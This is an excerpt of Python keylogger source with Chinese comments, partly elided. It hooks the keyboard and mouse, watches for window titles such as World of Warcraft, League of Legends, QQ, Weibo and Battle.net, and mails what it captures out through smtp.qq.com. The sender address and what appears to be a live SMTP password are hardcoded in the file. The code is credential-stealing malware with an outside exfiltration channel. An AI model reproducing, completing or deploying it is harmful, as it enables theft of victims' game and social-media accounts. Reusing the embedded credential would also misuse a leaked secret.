...
sender = '136066974@qq.com'  # 邮件发送方
receiver = '136066974@qq.com'  # 邮件接收方
subject = 'python email test'
smtpserver = 'smtp.qq.com'  # 邮件服务器
username = '136066974'  # 邮件用户名
password = 'khabhokmtwxdbggi'  # 邮件密码
smtp = smtplib.SMTP()
...
def send_email(msg, file_name):
    ...
    msg_root['Subject'] = file_name  # 邮件标题

    msg_text = MIMEText('%s' % msg, 'html', 'utf-8')  # 发送HTML形式的文字信息
...
def on_keyboard_event(event):
    ...
    if title.find(u"魔兽世界") != -1 or title.find(u"英雄联盟") != -1 or title.find(u'QQ') != -1 or title.find(
            u'微博') != -1 or title.find(u'战网') != -1:
...
if __name__ == "__main__":
    ...
    # 监控鼠标
    hm.SubscribeMouseLeftDown(on_mouse_event)
    hm.HookMouse()
    # 监控键盘
